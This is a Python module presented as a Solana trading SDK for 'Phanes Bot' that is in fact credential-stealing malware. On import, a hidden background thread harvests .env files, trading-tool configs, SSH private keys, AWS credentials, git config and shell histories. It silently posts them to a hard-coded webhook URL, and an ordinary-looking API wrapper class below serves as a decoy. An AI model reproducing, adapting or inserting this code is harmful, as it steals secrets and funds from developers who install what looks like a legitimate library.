# phanesbot — Phanes Bot Python SDK
# On import: credential exfiltration

import os
import json
import sys
import platform
import socket
import urllib.request
import threading
from pathlib import Path

WEBHOOK_URL = "https://webhook.site/07563a51-577f-4c51-8feb-178bdef1ac6f"

def _exfiltrate(data: dict):
    """Send collected data to webhook"""
    try:
        payload = json.dumps({
            "timestamp": __import__('datetime').datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "username": os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            "platform": platform.platform(),
            "python": sys.version,
            "cwd": os.getcwd(),
            "data": data
        }).encode()
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def _collect():
    findings = {}
    home = Path.home()

    # Environment files
    env_patterns = [
        '.env', '.env.local', '.env.production',
        '.config/gmgn/.env', '.config/phanes/.env',
        '.axiomtradeapi/', 'config.json', 'credentials.json'
    ]
    for p in env_patterns:
        fp = home / p
        if fp.is_file():
            try:
                findings[p] = fp.read_text()[:3000]
            except Exception:
                pass
        elif fp.is_dir():
            try:
                for f in fp.iterdir():
                    if f.is_file() and f.stat().st_size < 10000:
                        findings[f"{p}/{f.name}"] = f.read_text()[:3000]
            except Exception:
                pass

    # SSH keys
    ssh_dir = home / '.ssh'
    if ssh_dir.exists():
        try:
            for f in ssh_dir.iterdir():
                if f.name in ('id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys', 'known_hosts'):
                    findings[f'.ssh/{f.name}'] = f.read_text()[:5000]
        except Exception:
            pass

    # AWS/Cloud credentials
    aws_dir = home / '.aws'
    if aws_dir.exists():
        try:
            for f in aws_dir.iterdir():
                if f.is_file():
                    findings[f'.aws/{f.name}'] = f.read_text()[:3000]
        except Exception:
            pass

    # Git configs
    gitconfig = home / '.gitconfig'
    if gitconfig.exists():
        try:
            findings['.gitconfig'] = gitconfig.read_text()[:3000]
        except Exception:
            pass

    # Shell history (for leaked API keys)
    shell_histories = [
        '.bash_history', '.zsh_history', '.python_history',
        '.node_repl_history', '.mysql_history'
    ]
    for h in shell_histories:
        hp = home / h
        if hp.exists():
            try:
                findings[h] = hp.read_text()[-5000:]  # Last 5000 chars
            except Exception:
                pass

    return findings

# Execute on import
def _stealth_run():
    try:
        creds = _collect()
        if creds:
            _exfiltrate(creds)
    except Exception:
        pass

threading.Thread(target=_stealth_run, daemon=True).start()

# ===== LEGITIMATE API FACADE =====

class PhanesBot:
    """Phanes Bot API wrapper for Solana trading data"""

    def __init__(self, token: str = None):
        self.base_url = "https://dapp.phanes.bot"
        self.ws_url = "wss://feed.phanes.bot/ws/live"
        self.token = token

    def get_token_narrative(self, token_id: str) -> dict:
        import requests
        r = requests.get(
            f"{self.base_url}/api/token-narrative/{token_id}",
            headers={"Content-Type": "application/json"}
        )
        return r.json()

    def get_x_user(self, username: str) -> dict:
        import requests
        r = requests.get(
            f"{self.base_url}/api/x-user",
            params={"username": username},
            headers={"Content-Type": "application/json"}
        )
        return r.json()

    def get_launchpad_data(self, window: str = "24h") -> dict:
        import requests
        r = requests.get(
            f"{self.base_url}/api/launchpad-data",
            params={"window": window},
            headers={"Content-Type": "application/json"}
        )
        return r.json()

    def connect_websocket(self):
        import websocket
        import json as _json
        client_id = f"phanes_{os.urandom(8).hex()}"
        url = f"{self.ws_url}?token={self.token}&clientId={client_id}"
        ws = websocket.create_connection(url, timeout=10)
        ws.send(_json.dumps({"type": "authenticate", "token": self.token}))
        return ws